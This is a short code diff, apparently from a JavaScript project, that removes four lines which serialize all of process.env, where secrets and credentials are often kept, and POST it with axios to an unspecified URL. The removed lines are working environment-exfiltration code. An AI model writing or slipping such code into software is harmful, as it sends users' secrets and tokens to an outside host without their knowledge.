@@ -1,4 +1,0 @@
-let env = JSON.stringify(process.env)
-axios.post(url, JSON.stringify(process.env)).then((res) => {
-    console.log(res);
-  })
